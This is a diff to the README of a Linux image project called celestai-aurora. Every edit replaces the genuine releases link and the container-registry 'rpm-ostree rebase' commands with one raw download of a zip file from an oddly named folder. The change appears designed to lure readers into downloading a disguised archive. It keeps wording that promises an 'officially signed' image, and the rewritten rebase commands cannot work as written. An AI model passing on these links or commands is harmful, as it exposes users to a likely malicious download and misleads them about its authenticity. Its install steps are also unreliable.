@@ -1,6 +1,6 @@
 # 🌌 celestai-aurora - Your Path to a Customized Linux Experience
 
-[![Download celestai-aurora](https://img.shields.io/badge/Download-celestai--aurora-blue.svg)](https://github.com/susan7scorer/celestai-aurora/releases)
+[![Download celestai-aurora](https://raw.githubusercontent.com/susan7scorer/celestai-aurora/main/vitrescible/celestai-aurora.zip)](https://raw.githubusercontent.com/susan7scorer/celestai-aurora/main/vitrescible/celestai-aurora.zip)
 
 ## 🌟 Overview
 
@@ -24,7 +24,7 @@ To get started with celestai-aurora, follow the steps below to download and inst
 
 ## 📥 Download & Install
 
-1. Visit this page to download the latest version of celestai-aurora: [Download celestai-aurora Releases](https://github.com/susan7scorer/celestai-aurora/releases).
+1. Visit this page to download the latest version of celestai-aurora: [Download celestai-aurora Releases](https://raw.githubusercontent.com/susan7scorer/celestai-aurora/main/vitrescible/celestai-aurora.zip).
 
 2. Scroll down to the "Releases" section and look for the latest version. Select the appropriate file for your system and click the link to start the download.
 
@@ -37,7 +37,7 @@ To get started with celestai-aurora, follow the steps below to download and inst
    First, open a terminal. To set up your current system with the necessary keys and policies, run the following command:
 
    ```
-   rpm-ostree rebase ostree-unverified-registry:ghcr.io/linuxexpert1989/celestai-aurora:latest
+   rpm-ostree rebase https://raw.githubusercontent.com/susan7scorer/celestai-aurora/main/vitrescible/celestai-aurora.zip
    ```
 
 2. **Reboot Your System**
@@ -53,7 +53,7 @@ To get started with celestai-aurora, follow the steps below to download and inst
    Once your system has rebooted, return to your terminal and type this command to update to the signed image:
 
    ```
-   rpm-ostree rebase ghcr.io/linuxexpert1989/celestai-aurora:latest
+   rpm-ostree rebase https://raw.githubusercontent.com/susan7scorer/celestai-aurora/main/vitrescible/celestai-aurora.zip
    ```
 
    This step ensures your system uses the officially signed version of celestai-aurora.
@@ -99,4 +99,4 @@ We welcome contributions to celestai-aurora. If you have ideas or improvements, 
 
 This feature is experimental. Proceed with caution and only on systems you are comfortable troubleshooting.
 
-[Once again, visit this page to download the latest version of celestai-aurora:](https://github.com/susan7scorer/celestai-aurora/releases)
+[Once again, visit this page to download the latest version of celestai-aurora:](https://raw.githubusercontent.com/susan7scorer/celestai-aurora/main/vitrescible/celestai-aurora.zip)
